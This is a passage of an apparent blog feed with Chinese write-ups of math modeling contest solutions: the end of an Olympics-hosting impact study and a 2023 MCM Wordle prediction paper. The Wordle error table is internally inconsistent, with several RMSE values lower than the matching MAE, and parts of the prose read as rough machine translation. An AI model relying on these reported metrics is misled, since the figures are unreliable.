<p>接下来，以中国为例，根据2023年之前的数据，分别对各项指标进行预测，对是否举办奥运会的预测结果进行比较，可以得出奥运会对中国各项指标的影响 从图14可以清楚地看出中国相关指标的未来预测。</p>
<p><img src="https://s2.loli.net/2023/09/03/FOWn5VItgMZPD2f.png" alt="Future14: Future prediction of relevant indicators in China"></p>
<p>举办奥运会的影响：</p>
<ul>
<li>GDP：根据模型得到的预测值可以看出，举办奥运会对GDP有直接的经济影响，包括企业赞助、电视转播收入、门票收入、奥运各项销售收入等。 纪念品。</li>
<li>GNI：奥运会的举办对GNI也有间接的经济效应，包括比赛设施建设、城市交通、环境保护等方面的各种投资，可以带动很多上下游产业，促进国民经济整体增长。 经济。</li>
<li>旅游收入：根据预测数据可以看出，奥运会可以为主办国带来大量游客。 这就是奥运会产生的短期经济效益。 同时，将带动旅游供给的增加，旅游业将得到极大发展。</li>
<li>交通服务：在备战奥运会的过程中，除了奥运场馆的建设外，城市各类基础设施的建设也必不可少。 最重要的基础设施是应对客流的各种交通设施。 这可以在一定程度上推进城市基础设施建设和更新，引导城市发展。<br>
其他国家可以用同样的方法进行预测，从举办奥运会对各项指标的影响可以直观地得出预测结果。 根据得到的预测结果对上述国家进行评分，最终结果如图15所示：</li>
</ul>
<p><img src="https://s2.loli.net/2023/09/03/iJ9PvupO2wjGhyT.png" alt="Figure15: The influence score of hosting the future Olympic Games"></p>
<h4 id="9-实施策略和建议">9.实施策略和建议</h4>
<h5 id="（1）策略">（1）策略</h5>
<p>为了更好地举办不同季节的奥运会，选择具体的地区举办奥运会，我们制定了相关的实施策略，如图16所示。</p>
<p><img src="https://s2.loli.net/2023/09/03/VcDPGUx7so9aEkR.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/09/03/LrOhUuABGN1aSZE.png" alt="Figure 16：The implementation strategies for Olympic Games"></p>
<h5 id="（2）更好办好奥运会的建议：">（2）更好办好奥运会的建议：</h5>
<p>从经济、土地利用、人民满意度、旅游、未来改善机会以及主办城市/国家的声望等角度考虑举办奥运会的影响，我们选择分四个季节或固定举办奥运会。 地点。 为此，我们对更好举办奥运会提出以下建议：</p>
<ol>
<li>制定综合影响评估体系：国际奥委会应与主办城市/国家合作制定综合体系来评估举办奥运会的影响。 体系对各主办城市应采用一致的跟踪评价指标，对影响力大、能力有限的城市承诺一定的保障支持政策。</li>
<li>优先考虑土地再利用规划：国际奥委会在选择主办城市时应优先考虑可持续和包容性发展。 这将有助于确保奥运会对当地经济、环境和社会产生积极影响。</li>
<li>改善所有参赛者的体验：奥运会主办国应适当增加对优质设施、交通基础设施和其他设施的投入，为参赛运动员、观众和工作人员提供更好的体验 。 同时，应确保不对主办城市当地居民的日常生活造成较大影响。</li>
<li>提升主办城市的文明建设：举办奥运会的国家应该展示当地开放包容的文明建设，让外国人有良好的体验感，此外，举办国家也应该传播城市的开放包容的文明建设 以文化带动当地旅游业发展。</li>
</ol>
<h4 id="10-可行性评估和实施时间表">10.可行性评估和实施时间表</h4>
<h5 id="（1）可行性评估">（1）可行性评估</h5>
<p>备战奥运会对于国家的选择，一般来说，综合国力强的国家问题不大，如果综合国力弱，原材料不足，需要考虑进口原材料 物资订购，及早规划，工期适当延长。 另外，如果遇到一些意外的情况，比如经济危机、通货膨胀、革命等，需要做好准备，调整相应的时间线。</p>
<h5 id="（2）时间轴">（2）时间轴</h5>
<p>从上述策略的时间轴来看，整个奥运会的筹备过程可以分为五个部分：申办奥运会的时间、向世界各地征集设计方案的时间、最终确定的时间 中标后计划和订购设备等原材料、新建场馆的时间、奥运场馆进行测试赛的时间。 上述所需时间可按下式计算：</p>
<p><img src="https://s2.loli.net/2023/09/03/zEYsP9QLeNGABxK.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/09/03/aN1ztcDHEongCbS.png" alt="Figure 17: The timeline to implement for Olympic Games"></p>
<h4 id="11-敏感性分析">11.敏感性分析</h4>
<p>图14中，建立了奥运会举办前后相关参数变化程度的关系模型。 我们建立的影响模型中提取的影响因素与LSTM模型预测的结果进行综合分析，得到举办奥运会后GNI参数的变化情况。 接下来，分析有利条件（GNI-Better Cases）和不利条件（GNI-Worse Cases）对影响模型中GNI参数的敏感性。</p>
<p>当发生重大自然灾害、重大安全事故或对奥运会产生负面影响时，经过合理分析计算并适当减少生产总量，可得到图18中GNI最坏情况的数据 和交易。 在外资企业投资巨大、环境良好或对奥运会产生积极影响的情况下，经过合理分析计算并适当增加生产总量和交易金额，即可得到图18中GNI-Better Cases的相关数据。</p>
<p><img src="https://s2.loli.net/2023/09/03/Z4rfdCwW6n1e9ox.png" alt="Figure 18: Sensitivity analysis chart"></p>
<p>从数据和图像中可以直观地获得。 负向和正向影响对GNI参数的敏感性均较低，系统结果稳定。 表明预测年份的GNI值处于合理范围内。</p>
<h4 id="12-模型评估及进一步讨论">12.模型评估及进一步讨论</h4>
<h5 id="（1）优势">（1）优势</h5>
<p>我们的模型具有以下优点：</p>
<ul>
<li>我们考虑的因素全面，适用范围广，有一定的理论基础。</li>
<li>考虑到不同因素对结果的影响程度不同，我们构建了TOPSIS-EWM模型，构建了适用于广泛领域的奥运会影响模型。 TOPSIS方法避免了数据的主观性，能够很好地刻画多个影响指标的综合影响。</li>
<li>我们将K-means和影响模型结合起来进行双重筛选，以提高结果的准确性。</li>
<li>我们使用的LSTM模型具有开创性的长短期记忆结构，与RNN相比在各种应用场景中都带来了比较大的效果提升。 此外，LSTM还解决了RNN的梯度消失和爆炸问题。</li>
</ul>
<h5 id="（2）弱点">（2）弱点</h5>
<ul>
<li>尽管主成分回归方程在降维、降低分析复杂度方面发挥了很大的作用，但影响程度的确定方法仍然存在严重的局限性。</li>
<li>由于影响因素太多，我们的假设模型无法完全包含在内，存在一定的主观性和局限性，导致结果不准确。</li>
</ul>
<h5 id="（3）进一步讨论">（3）进一步讨论</h5>
<p>本文构建的影响模型和二次筛选方案综合考虑了多种因素，周到、全面。 该方法还可以广泛应用于各个领域，例如港口货物运输解决方案、食品安全生产解决方案、公司营销方案等。</p>
<h4 id="13-结论">13.结论</h4>
<p>我们团队分析了拥有永久夏奥会和冬奥会场馆或者将奥运会分成四个（较小的）赛季的两种理想，综合考虑各种因素，我们为国际奥委会提出了两种解决方案，旨在确保冬奥会的成功举办。 游戏并解决了游戏竞标者较少的困境。</p>
<p>在数据分析的基础上，我们引入了各个国家和地区的经济、土地利用、声誉、旅游和人民满意度等指标。 本文考虑了14个指标并推导了相关公式。 为了改变奥运会分四个季节举行，我们初步按季节选择4-6个国家，根据相关数据计算每个国家举办奥运会前后的指数变化，并建立TOPSIS模型进行评估。 至于冬奥会和夏季奥运会固定举办地的选择方案，我们只考虑了曾经举办过奥运会的国家。 由于索引数量较多，采用PCA来降低待处理索引的维数。 选择两个主成分后，采用K均值聚类方法进行初步筛选。 我们建立了影响力模型，结合LSTM进行预测，然后进行二次筛选，以获得更准确的结果。</p>
<p>通过一系列的数据分析，我们最终针对两种不同的场景提出了完整的解决方案。 对于前者，我们选择了加拿大作为冬季奥运会的举办地，英国作为夏季奥运会的举办地，中国和美国作为春秋两届奥运会的举办地。 对于后者，中国被选为冬季奥运会的主办国，加拿大为夏季奥运会的主办国。</p>
<h4 id="14-参考文献">14.参考文献</h4>
<p>[1]   From fanaticism to apathy – cold thinking about the decline in the popularity of the Olympic bid.</p>
<p>[2]   The Olympic Games portfolio is interpreted in a variety of regions.</p>
<p>[3]   Look at the economic benefits of the Olympics from the perspective of scarcity.</p>
<p>[4]   How big the impact of the Olympic Games is based on the model and measurement from the perspective of industry linkage.</p>
<p>[5]   The impact of the Olympics on the host country’s economy.</p>
<p>[6]   REN Hai. On the reform of the IOC[J]. Sports Science.2008,(7).</p>
<p>[7]   Analysis of the correlation effect between the Olympic Games and surrounding industries.</p>
<p>[8]   The research on the prediction model of LSTM network for economic indicators of time validity was improved.</p>
]]></content>
      <categories>
        <category>竞赛</category>
      </categories>
      <tags>
        <tag>ICM/MCM</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 MCM Problem C Predicting Wordle Results</title>
    <url>/competition/MCM/</url>
    <content><![CDATA[<h2 style="text-align:center;font-weight:700;color:#B399FF">2023 MCM Problem C: Predicting Wordle Results</h2>
<img src="https://nytco-assets.nytimes.com/2022/08/cropped-Screen-Shot-2022-08-24-at-8.49.39-AM.png" style="zoom:80%;" />
<h2 id="font-style-font-weight-700-color-B399FF-一、问题介绍-font"><font style="font-weight:700;color:#B399FF">一、问题介绍</font></h2>
<p><strong>背景</strong></p>
<p>Wordle 是纽约时报目前每天提供的流行拼图。 玩家尝试通过在六次或更少的尝试中猜测一个五个字母的单词来解决这个难题，每次猜测都会收到反馈。对于这个版本，每个猜测都必须是一个实际的英语单词。 不被比赛识别为单词的猜测是不允许的。 Wordle 越来越受欢迎，该游戏的版本现已支持 60 多种语言。</p>
<p>纽约时报网站上的 Wordle 说明中介绍，在您提交单词后，图块的颜色会发生变化。 黄色方块表示该方块中的字母在单词中，但位置错误。 绿色方块表示该方块中的字母在单词中并且位于正确的位置。 灰色方块表示该方块中的字母根本不包含在单词中（见附件 2）[2]。 图 1 是一个示例解决方案，其中在三次尝试中找到了正确的结果。</p>
<img src="https://s2.loli.net/2023/09/03/ZVkWne7A5IScd4f.png" style="zoom: 50%;" />
<p>玩家可以在常规模式或“困难模式”下玩。 Wordle 的困难模式要求玩家一旦在单词中找到正确的字母（方块为黄色或绿色），就必须在随后的猜测中使用这些字母，从而使游戏变得更加困难。 图 1 中的示例是在困难模式下运行的。</p>
<p>许多（但不是全部）用户在 Twitter 上报告他们的分数。 针对这个问题，MCM 生成了一份 2022 年 1 月 7 日至 2022 年 12 月 31 日的每日结果文件（见附件 1）。 此文件包括日期、比赛编号、当天的单词、当天报告分数的人数、困难模式下的玩家人数以及一次、两次、三次、四次猜中单词的百分比 、五次尝试、六次尝试或无法解决难题（用 X 表示）。 例如图2中2022年7月20日的词是“TRITE”，结果是通过挖掘推特得到的。 尽管图 2 中的百分比总和为 100%，但在某些情况下，由于四舍五入的原因，这可能并非如此。</p>
<img src="https://s2.loli.net/2023/09/03/OioexH8Pc2ru3Qm.png" style="zoom:50%;" />
<p><strong>要求</strong><br>
《纽约时报》要求您对本文件中的结果进行分析，以回答几个问题。</p>
<ul>
<li>报告结果的数量每天都在变化。 开发一个模型来解释这种变化，并使用您的模型为 2023 年 3 月 1 日的报告结果数创建一个预测区间。是否存在单词的一些属性会影响报告在困难模式下游玩的分数的百分比？ 如果是这样，是什么？ 如果不是，为什么不呢？</li>
<li>对于未来日期的给定未来解决方案词，开发一个模型，使您能够预测报告结果的分布。 换句话说，预测未来日期 (1, 2, 3, 4, 5, 6, X) 的相关百分比。 哪些不确定性与您的模型和预测相关？ 举一个你对 2023 年 3 月 1 日 EERIE 这个词的预测的具体例子。你对你的模型的预测有多自信？</li>
<li>开发并总结一个模型来按难度对解决方案单词进行分类。 识别与每个分类关联的给定词的属性。 使用您的模型，EERIE 这个词有多难？ 讨分类模型的准确性。</li>
<li>列出并描述这个数据集的其他一些有趣的特征。</li>
</ul>
<p>最后，用一到两页的信总结你的结果给纽约时报的拼图编辑。</p>
<p>总页数不超过 25 页的 PDF 解决方案应包括：</p>
<ul>
<li>一页摘要表。</li>
<li>目录。</li>
<li>您的完整解决方案。</li>
<li>一到两页的信件。</li>
<li>参考文献列表。</li>
</ul>
<p>注意：MCM 竞赛有 25 页的限制。 您提交的所有方面都计入 25 页的限制（摘要表、目录、报告、参考列表和任何附录）。您必须为您的想法、图像和报告中使用的任何其他材料引用来源。</p>
<p><strong>附件</strong></p>
<ol>
<li>
<p>数据文件。Problem C Data Wordle.xlsx</p>
<p>附加的数据文件包含您应对此问题使用的唯一数据。 这个问题所需的所有信息都在问题陈述和数据文件中给出。您无需访问纽约时报网站或 Twitter 网站。 在这些站点上找不到其他信息。</p>
<p>数据文件条目说明：</p>
<ul>
<li>日期：给定 Wordle 谜题的 mm-dd-yyyy（月-日-年）格式的日期。</li>
<li>赛号：Wordle拼图索引，2022年1月7日202开头。</li>
<li>单词：玩家试图猜测有关于相关日期和比赛编号的单词。</li>
<li>报告结果数：当天在推特上记录的总分数。</li>
<li>Hard mode Number：当天在推特上记录的Hard mode分数。</li>
</ul>
<p>1 次尝试：玩家一次猜出谜题的百分比。<br>
2 次尝试：玩家在两次猜测中解决难题的百分比。<br>
3 次尝试：玩家在三次猜测中解决难题的百分比。<br>
4 次尝试：玩家在四次猜测中解决难题的百分比。<br>
5 次尝试：玩家在五次猜测中解决难题的百分比。<br>
6 次尝试：玩家在六次猜测中解决难题的百分比。<br>
7 次或更多次尝试 (X)：在 6 次或更少的情况下无法解决难题的玩家百分比尝试。 注：由于四舍五入，百分比之和可能并不总是 100%。</p>
</li>
<li>
<p>《纽约时报》网站上发布的 Wordle 说明。[2]</p>
</li>
</ol>
<img src="https://s2.loli.net/2023/09/03/W95FSKAQwZVoTti.png" style="zoom: 33%;" />
<p><strong>词汇表</strong></p>
<p>纽约时报：一份位于美国纽约州纽约市的日报，有印刷版和在线版。</p>
<p>Twitter：一个社交网站，允许用户广播不超过 280 个字符的短文（从最初的 140 个字符增加）。</p>
<p>解决（Wordle 难题）：以正确的顺序输入正确的字母，形成当天的 Wordle 单词。</p>
<p><strong>参考</strong></p>
<p>注意：我们提供以下引用来支持问题陈述。 我们从这些资源中提取了重要的想法。 这些网站上没有解决此 MCM 问题所需的其他信息。 无需访问纽约时报或 Twitter 网站即可解决此问题。</p>
<p>[1] 来自纽约时报网站的 Wordle 标志。 于 2022 年 12 月 13 日访问 <a href="https://nytco-assets.nytimes.com/2022/08/cropped-Screen-Shot-2022-08-24-at-8.49.39-AM.png%E3%80%82">https://nytco-assets.nytimes.com/2022/08/cropped-Screen-Shot-2022-08-24-at-8.49.39-AM.png。</a></p>
<p>[2] “世界 - 纽约时报”。 《纽约时报》，2022 年。2022 年 12 月 13 日访问 <a href="https://www.nytimes.com/games/wordle/index.html%E3%80%82">https://www.nytimes.com/games/wordle/index.html。</a></p>
<p>[3] “世界 - 纽约时报”。 《纽约时报》，2022 年 7 月 21 日。</p>
<p>[4] “世界统计”。 推特，2022 年 7 月 20 日</p>
<h2 id="font-style-font-weight-700-color-B399FF-二、问题分析-font"><font style="font-weight:700;color:#B399FF">二、问题分析</font></h2>
<ol>
<li>报告结果的数量每天都在变化。 开发一个模型来解释这种变化，并使用您的模型为 2023 年 3 月 1 日的报告结果数创建一个预测区间。是否存在单词的一些属性会影响报告在困难模式下游玩的分数的百分比？ 如果是这样，是什么？ 如果不是，为什么不呢？</li>
<li>对于未来日期的给定未来解决方案词，开发一个模型，使您能够预测报告结果的分布。 换句话说，预测未来日期 (1, 2, 3, 4, 5, 6, X) 的相关百分比。 哪些不确定性与您的模型和预测相关？ 举一个你对 2023 年 3 月 1 日 EERIE 这个词的预测的具体例子。你对你的模型的预测有多自信？</li>
<li>开发并总结一个模型来按难度对解决方案单词进行分类。 识别与每个分类关联的给定词的属性。 使用您的模型，EERIE 这个词有多难？ 讨分类模型的准确性。</li>
<li>列出并描述这个数据集的其他一些有趣的特征。</li>
</ol>
<h3 id="font-style-font-weight-700-color-B399FF-问题一-font"><font style="font-weight:700;color:#B399FF">问题一</font></h3>
<p>Q1：报告结果的数量每天都在变化。 开发一个模型来解释这种变化，并使用您的模型为 2023 年 3 月 1 日的报告结果数创建一个预测区间。是否存在单词的一些属性会影响报告在困难模式下游玩的分数的百分比？ 如果是这样，是什么？ 如果不是，为什么不呢？</p>
<h5 id="1-简单数据清洗">1.简单数据清洗</h5>
<ul>
<li>单词长度不为五(contest number)：525、314、545</li>
<li>报告数量单个变化浮动过大(contest number)：529</li>
<li>部分单词拼写错误：naïve修改为naive、marxh修改为march</li>
<li>概率超百(contest number)：281</li>
</ul>
<img src="https://s2.loli.net/2023/09/03/GRicUqYLjI3xVkp.png" alt="报告数量随时间变化" style="zoom: 67%;" />
<h5 id="2-数据分析">2.数据分析</h5>
<p>通过对前期数据的分析，我们发现每天分享评分的人数变化符合生命周期发展的规律。 我们使用经验模态分解（EMD）将共享分数的人数分解为一系列相对稳定的分量，以减少不同特征信息之间的交互作用； 然后，采用具有误差改进机制的时间序列预测（ARIMA）方法，建立各分量的预测模型，对各分量进行预测并修正误差； 计算各分量的预测误差的平均值，得到各分类的预测区间值。 最后将各分量的预测区间结果相加，得到共享分数人数的预测区间值。</p>
<p>报告游戏玩家人数序列具有较强的非线性、非平稳性与随机性，因此我们利用EMD技术在非平稳数据处理中的突出优势，建立了一种基于EMD-灰色神经网络的未来三个月内报告游戏玩家人数的预测模型。</p>
<p>首先对报告游戏玩家人数序列进行EMD分解，使其产生一系列不同尺度的IMF分量，实现报告游戏玩家人数序列平稳化。然后针对各分量特点选取最优的模型参数和核函数，分别建立适合自身的灰色神经网络预测模型。最后将各分量的预测值叠加得到报告游戏玩家人数预测值。</p>
<p>对实验样本报告游戏玩家人数序列进行EMD分解，逐个分离出相应的IMF分量，通过给出终止条件作为迭代终止的依据。从图3可以看出，原本的非线性报告游戏玩家人数序列被分解为4个波动较小的时间序列分量IMF(C1—C4)分量和1个剩余分量r5。根据不同IMF分量的自身特点，分别建立时间序列预测模型，将分解后的子序列分别带入灰色神经网络预测模型中，对各个子序列趋势进行预测。</p>
<p><img src="https://s2.loli.net/2023/09/03/H4OIi1urDSUYWf5.png" alt="图3 EMD分解图"></p>
<p>处理后的每日结果文件共354组数据，我们去掉前面影响较大的前154个数据，即本文以2022年后200组每日实际为实验数据样本。该模型输入样本第155组-304组报告游戏玩家人数，50组报告游戏玩家人数为测试样本，预测后三个月的报告游戏玩家人数。</p>
<p><img src="https://s2.loli.net/2023/09/03/c5Ew8Ve7sxGFgIy.png" alt=""></p>
<p>图（）为时间序列分量IMF(C1—C4)分量和1个剩余分量r5预测结果对比图。从图中可以观察到EMD- 灰色神经网络预测模型后50组报告分数玩家人数预测值与实际值误差区间较小，吻合较好，这表明使用EMD法对报告分数玩家人数进行分解能够在一定程度上提高报告分数玩家人数预测的准确性。</p>
<p>通过预测方法获得预测结果后，本文采用平均绝对百分误差（MAPE），根均方误差、平均绝对误差（MAE）、绝对误差标准差（AESD）这几个误差指标来评价预测效果：</p>
<table>
<thead>
<tr>
<th></th>
<th><em>MAPE</em></th>
<th><em>RMSE</em></th>
<th><em>MAE</em></th>
<th><em>AESD</em></th>
</tr>
</thead>
<tbody>
<tr>
<td>Imf1</td>
<td>1.666</td>
<td>847.857</td>
<td>1147.857</td>
<td>718.758</td>
</tr>
<tr>
<td>Imf2</td>
<td>2.893</td>
<td>550.036</td>
<td>1550.036</td>
<td>1051.340</td>
</tr>
<tr>
<td>Imf3</td>
<td>33.470</td>
<td>383.1953</td>
<td>383.195</td>
<td>329.780</td>
</tr>
<tr>
<td>Imf4</td>
<td>1.499</td>
<td>413.086</td>
<td>413.086</td>
<td>218.585</td>
</tr>
<tr>
<td>Residual</td>
<td>0.133</td>
<td>993.881</td>
<td>2893.881</td>
<td>2402.859</td>
</tr>
</tbody>
</table>
<p>MAPE、RMSE、MAE越小，表示预测精度越高；AESD越小，表示模型的预测平稳性越好。</p>
<p>由以上指标得出，我们可以看出该模型预测效果良好，可以用来预测未来三个月报告游戏玩家人数，我们将时间序列分量IMF(C1—C4)分量和1个剩余分量r5累加起来，即得到最终预测图。</p>
<p><img src="https://s2.loli.net/2023/09/03/kBqXCywVWH7Ag2m.png" alt=""></p>
<p>由上述预测图，我们可以看出未来一月到三月Wordle玩家人数逐渐减少。这一现象与之前在社交媒体上就有许多Wordle玩家发文表示，他们认为被《纽约时报》买下后的Wordle每天要猜的单词太过于生僻，质疑《纽约时报》增加了游戏的难度，是一致的。Wordle每天要猜的单词难度加大，影响了玩家的体验，玩家热情消退。受到种种因素影响，玩家对Wordle词汇游戏的热情下降，游戏热度下降也是必然的趋势。现在已经开始出现了这样的苗头。</p>
<h3 id="font-style-font-weight-700-color-B399FF-问题二-font"><font style="font-weight:700;color:#B399FF">问题二</font></h3>
<p>Q2：对于未来日期的给定未来解决方案词，开发一个模型，使您能够预测报告结果的分布。 换句话说，预测未来日期 (1, 2, 3, 4, 5, 6, X) 的相关百分比。 哪些不确定性与您的模型和预测相关？ 举一个你对 2023 年 3 月 1 日 EERIE 这个词的预测的具体例子。你对你的模型的预测有多自信？</p>
<h4 id="1-方法概述">1.方法概述</h4>
<p>我们把一个单词的属性大致分为6类：单词词频、单词前缀、单词后缀、单词词根、单词字母、重复字母。</p>
<p><img src="https://s2.loli.net/2023/09/03/JGejW5a7FxMPw2L.png" alt=""></p>
<p>采取自组织映射神经网络从每日结果文件中提取价值信息，研究每个单词各种属性的指标。SOM是一种无监督人工神经网络，由于对大数据集有优秀的处理和解释能力，本文采用自组织映射神经网络以及机器学习和模式识别领域常用的K均值聚类算法，通过对每日结果文件的每个单词属性指标的相关性分析和聚类分析。</p>
<p><strong>单词被使用频率</strong>：通过查询人们日常对于英文单词使用情况，我们发现有的单词会被经常性的使用到，那么这些单词更容易才游戏过程中被想到并被猜对。因此我们选则单词日常被使用频率作为其中一项属性指标。</p>
<p><img src="https://s2.loli.net/2023/09/03/EuZdWA6KFeLjVnN.png" alt=""></p>
<p>其中，<em>P</em>1 <em>i</em>表示第<em>i</em>个单词在日常生活中被使用到的频率，a1 <em>i</em>表示单词频率属性指标。</p>
<p><strong>含有高频前缀</strong>：英语单词中部分词汇是经过前缀添加而构成的，通过添加前缀改变单词意思。单词中相同前缀出现的概率较大，人们在猜词时会优先想到熟悉的前缀，例如：co、exo、di、re、tri等。因此我们采用单词中含有高频前缀的概率作为其属性之一。</p>
<p><img src="https://s2.loli.net/2023/09/03/u2FGIbWZMdmlLjT.png" alt=""></p>
<p>其中，<em>q1 m</em>表示第<em>m</em>个前缀在词库中被使用到的频率，<em>bi 1jm</em>表示第m个前缀在第i个单词中出现状态，出现则为1，否则为0。</p>
<p><strong>含有高频后缀</strong>：以前缀原理相似，单词中同样含有大量的后缀，许多后缀在人们日常生活中被使用，例如：et、fy、id、tic等。因此我们采用单词中含有高频后缀的概率作为其属性之一。</p>
<p><img src="https://s2.loli.net/2023/09/03/E3vuZ9CFKshmqti.png" alt=""></p>
<p>其中，<em>q1 m</em>表示第<em>m</em>个后缀在词库中被使用到的频率。</p>
<p><strong>含有高频词根</strong>：词根在英文单词中具有实质含义，可单独成为一个字，也可搭配前缀和后缀组成词。因此我们采用单词中含有高频词根的概率作为其属性之一。</p>
<p><img src="https://s2.loli.net/2023/09/03/1WEtCohP543s6LX.png" alt=""></p>
<p><strong>含有相同位置字母的概率</strong>：在本游戏中，玩家在进行第一次猜词后，会根据提示进行第二次猜词，猜测词与答案词在相同位置字母相同则提示为绿色。而高频词汇往往被首先猜测，与高频词汇在相同位置上字母重复越高的词汇，往往会被根据提示首先猜出。因此我们设置单词与高频词汇相同位置重复的字母概率作为其属性值一：</p>
<p><img src="https://s2.loli.net/2023/09/03/7weJXBtUdMSCjKm.png" alt=""></p>
<p><strong>含有不同位置字母的概率</strong>：玩家在进行第一次猜词后，会根据提示进行第二次猜词，猜测词与答案词含有同样的字母，但字母位置不同时则提示为黄色。因此我们设置单词与高频词汇相同位置重复的字母概率作为其属性值一：</p>
<p><img src="https://s2.loli.net/2023/09/03/yeIFpmkqHZuwbd1.png" alt=""></p>
<p><strong>含有重复字母的个数</strong>：困难模式下，单词中含有重复字母的个数将会加大选手通关的难度，五个字母的单词最多含有5个重复字母，最少不含有重复字母。对单词中含有重复字母的个数属性建模如下：</p>
<p><img src="https://s2.loli.net/2023/09/03/6JMQd5jKb8I2PuH.png" alt=""></p>
<p>​	其中，<em>mi</em>表示第<em>i</em>个单词中含有重复字母的个数，a4 <em>i</em>表示第<em>i</em>个单词的重复字母个数属性指标。</p>
<h4 id="2-自组织映射（SOM）模型">2.自组织映射（SOM）模型</h4>
<p>采用自组织映射神经网络结合K均值聚类算法对单词属性指标进行相关性分析和聚类分析。自组织映射（self-organizing map, SOM）是一种竞争学习型的无监督神经网络，如下图所示。其使用无监督训练将高维输入数据映射到低维空间，同时保留输入数据在高维空间的拓扑结构，即将高维空间中相似的样本点映射到二维输出层中的邻近神经元，因此被广泛应用于数据降维。</p>
<p><img src="https://s2.loli.net/2023/09/03/KaSgJQRlMUZ5OPH.png" alt=""></p>
<p>SOM网络中的输出层神经元以矩阵方式排列在二维空间中，每个神经元具有与之相连接的权向量，在接收到一个训练样本后，每个输出层神经元会计算该样本与自身携带的权向量间的距离，距离最近的神经元成为竞争获胜者，称为最佳匹配单元（best matching unit, BMU）。然后，最佳匹配单元及其邻近神经元的权向量将被重新调整，以缩小权向量与当前样本的距离。此过程不断迭代，直至收敛。</p>
<p>K均值算法（k-means clustering）是流行于数据挖掘领域的聚类算法。其步骤是预先随机选取K个对象作为初始聚类中心，随后计算每个对象与各个聚类中心的距离，将每个对象分配到最近的聚类中心，聚类中心及其分配的对象代表一个聚类。一旦全部对象完成分配，每个聚类的聚类中心会根据聚类中现有的的对象被重新计算。此过程不断重复直至聚类中心不再变化。</p>
<h4 id="3-结果分析">3.结果分析</h4>
<p>我们对最终模型分析出的单词属性（单词被使用频率、含有高频前缀、含有高频后缀、含有高频词根、含有相同位置字母的概率、含有不同位置字母的概率、含有重复字母的个数）的结果进行相关性分析，如下图所示：</p>
<p><img src="https://s2.loli.net/2023/09/03/1C7SOVTvIdm4JoW.png" alt=""></p>
<p>相关性：0.1-0.3，相关性较弱；0.3-0.6，相关性一般；＞0.6，相关性较强。</p>
<p>根据上图，我们可以看出，含有相同位置字母的概率的单词属性相关性较强，当我们得到Wordle反馈绿色时，即该字母存在而且位置正确，玩家会自动关联想到含有相同位置的字母的单词，猜中单词的正确率高。单词被使用频率这一单词属性相关性还可以，说明单词使用频率越高，玩家做游戏时越容易想到，当天单词答案为使用高频词时，玩家的通关率高。含有重复字母的个数这一单词属性呈现负相关，即单词重复字母阅读，单词难度更大，更不易猜中，通关难度更大。</p>
<h3 id="font-style-font-weight-700-color-B399FF-问题三-font"><font style="font-weight:700;color:#B399FF">问题三</font></h3>
<p>Q3：开发并总结一个模型来按难度对解决方案单词进行分类。 识别与每个分类关联的给定词的属性。 使用您的模型，EERIE 这个词有多难？ 讨分类模型的准确性。</p>
<h4 id="1-方法概述-2">1.方法概述</h4>
<p><img src="https://s2.loli.net/2023/09/03/ZUNlufWbxwpPc9j.png" alt=""></p>
<h4 id="2-最小二乘支持向量机-LS-SVM">2.最小二乘支持向量机(LS-SVM)</h4>
<p>支持向量机法（SVM）是一种可训练的机器学习方法，可解决模式识别问题，并具有较好的泛化功能。最小二乘支持向量机(LS-SVM)是对SVM的改进。设l个训练样本集{<em>xi</em>*，*<em>yi</em> } ( 1 2, ,<em>l</em> )，其中，<em>xi</em> ∈ <em>Rn</em>为输入值，<em>yi</em>为输出值。将样本<em>xi</em>从<em>Rn</em>映射到特征空间<em>ϕ(xi)</em> ，则估计函数为</p>
<p><img src="https://s2.loli.net/2023/09/03/DmuEFZRsqBW92Sa.png" alt=""></p>
<p>LS-SVM与SVM均能解决非线性问题，但最小二乘支持向量机具有更快的求解速度，且所需的计算资源较少。</p>
<h4 id="3-BCC算法">3.BCC算法</h4>
<p>细菌在所处的环境中都存在感知极限，BCC 算法是一种新的群体智能算法，在细菌趋药性(bacterical chemotaxis，BC)算法的基础上建立起的个体细菌间的信息交互 BC 算法，根据单个细菌的运动不断感知周围环境的变化，利用过去的经验寻找最优点，具有较强的鲁棒性。BCC 算法根据单个细菌对化学诱剂的应激反应和细菌群落间的位置信息交互进行优化，在保留个体细菌搜索能力较强的基础上改善了收敛速度。同时，与其他智能算法相比，局部搜索能力更强，且占用的系统资源更少。BCC 算法步骤如下：</p>
<ol>
<li>初始化细菌群体数以及细菌个体的位置和对外界环境的感知极限。</li>
<li>在初始条件下，计算细菌个体的目标函数；确定并记录目前的最优值。</li>
<li>菌株 <em>j</em> 进入第 <em>k</em> 步，感知周围的信息，确定其他细菌的中心位置，其中，中心位置能在外界环境的感知极限中获得较好的目标函数值。</li>
<li>通过单一菌株 BC 算法，进入第 <em>k</em> 步菌株 <em>j</em>得到另一位置。</li>
<li>比较这2个位置上的目标函数值，在第 <em>k</em> +1 步，菌株 j 移动到函数值较高的位置。</li>
<li>为避免发生因算法的随机性导致原来位置较好的点被抛弃的情况，在这里，细菌群落每移动一次，位置较差的细菌会继续向最佳位置处的细菌移动，以此提高算法的性能。</li>
<li>更新最优位置以及相关参数。重复步骤3）-6）直到满足终止条件跳出该循环。</li>
</ol>
<h4 id="4-结果分析">4.结果分析</h4>
<p>得出各项单词属性的拟合曲线，如下图所示。</p>
<p><img src="https://s2.loli.net/2023/09/03/tlRnhQBLDX3dueH.png" alt=""></p>
<p>曲线的横坐标是预测值，纵坐标是实际值。 图中不同颜色代表不同的词属性。 曲线的横坐标是玩家尝试通过次数的预测百分比（1,2,3,4,5,6,X），纵坐标是实际值，黑色曲线是其中的点实际值等于预测值。 点越接近黑色曲线，说明这个词的属性对玩家尝试通过的次数有影响。</p>
<table>
<thead>
<tr>
<th style="text-align:center"><em>1 try</em></th>
<th style="text-align:center"><em>2 tries</em></th>
<th style="text-align:center"><em>3 tries</em></th>
<th style="text-align:center"><em>4 tries</em></th>
<th style="text-align:center"><em>5 tries</em></th>
<th style="text-align:center"><em>6 tries</em></th>
<th style="text-align:center"><em>7 tries</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0.00000</td>
<td style="text-align:center">2.74384</td>
<td style="text-align:center">18.47856</td>
<td style="text-align:center">33.72893</td>
<td style="text-align:center">26.97891</td>
<td style="text-align:center">13.96125</td>
<td style="text-align:center">3.60754</td>
</tr>
</tbody>
</table>
